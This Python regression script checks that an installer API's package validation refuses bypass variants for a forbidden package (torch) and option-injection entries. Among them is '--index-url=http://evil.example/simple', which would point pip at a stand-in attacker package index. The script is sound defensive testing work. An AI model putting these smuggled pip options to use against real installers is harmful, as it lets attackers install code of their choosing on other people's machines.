"""R5-02: the install guard, before and after.

`POST /api/v1/installer/install` takes `packages`, `constraints` and
`comfy_venv_python` from the client. The check protecting ComfyUI's
virtualenv was `forbidden.intersection(packages)` on bare distribution
names, so anything that was not an exact string match walked past it, and
`build_command` appended the package list with no `--` separator, so a
string starting with `-` reached pip as an *option* rather than as a name.

Run from the repo root:  python scripts/repro/r22_install_entry_validation.py

Expects every line to read REFUSED. A line reading ACCEPTED means the entry
reached pip; the command it would have run is printed, which is the part
that matters -- for `comfy` that is a pip run against a venv this project
does not own, which is the one operation the design refuses.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from backend.application.ports.package_installer import (  # noqa: E402
    InstallError,
    InstallRequest,
    PipInstaller,
)
from backend.application.ports.requirements_manifest import REQUIREMENTS  # noqa: E402
from backend.application.use_cases.install_packages import (  # noqa: E402
    validate_install_entries,
)

FORBIDDEN = next(r.distribution for r in REQUIREMENTS if r.never_install)
KNOWN = next(r.distribution for r in REQUIREMENTS if not r.never_install)

BYPASSES = [
    (FORBIDDEN, "exact match -- the one case the old guard caught"),
    (f"{FORBIDDEN}==2.5.0", "a version pin"),
    (FORBIDDEN.upper(), "TORCH is not the string torch"),
    (FORBIDDEN.capitalize(), "Torch, from the other direction"),
    (f"{FORBIDDEN}[opt]", "extras"),
    (f"{FORBIDDEN}>=1", "a range"),
    (f" {FORBIDDEN}", "leading whitespace, which PEP 508 allows"),
    ("pytorch-triton-xpu", "a torch companion, no manifest row"),
    (f"{FORBIDDEN} @ https://example.invalid/t.whl", "a direct URL"),
    (f'{FORBIDDEN};python_version < "3"', "an environment marker"),
]

OPTIONS = [
    "--index-url=http://evil.example/simple",
    "-r",
    "--upgrade",
]


def attempt(target: str, packages) -> str:
    """The refusal message, or what pip would have been asked to run."""
    try:
        validate_install_entries(packages, (), target)
    except InstallError as exc:
        return f"REFUSED  ({str(exc)[:64]}...)"
    command = PipInstaller().build_command(
        InstallRequest(target_python="/venv/bin/python",
                       packages=tuple(packages)))
    return f"ACCEPTED -> pip would run: {' '.join(command[1:])}"


def main() -> int:
    accepted = 0

    print(f"target=comfy (ComfyUI's own venv; {FORBIDDEN} must never be touched)")
    for entry, why in BYPASSES:
        outcome = attempt("comfy", [entry])
        accepted += outcome.startswith("ACCEPTED")
        print(f"  {entry!r:52} {outcome}")
        print(f"      {why}")

    print("\noption injection through the package list")
    for target in ("comfy", "new"):
        for entry in OPTIONS:
            outcome = attempt(target, [entry, KNOWN])
            accepted += outcome.startswith("ACCEPTED")
            print(f"  target={target:5} {entry!r:44} {outcome}")

    print("\nconstraint lines, which are written into a file pip reads")
    for line in ("--index-url=http://evil.example/simple", "-r /some/file",
                 f"{FORBIDDEN} @ https://example.invalid/x", FORBIDDEN):
        try:
            validate_install_entries((KNOWN,), (line,), "new")
            outcome, bad = "ACCEPTED", True
        except InstallError as exc:
            outcome, bad = f"REFUSED  ({str(exc)[:64]}...)", False
        accepted += bad
        print(f"  {line!r:52} {outcome}")

    print("\n" + "=" * 60)
    if accepted:
        print(f"R5-02: {accepted} ENTRY/ENTRIES REACHED PIP")
        return 1
    print("R5-02: every bypass variant is refused, for both targets")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
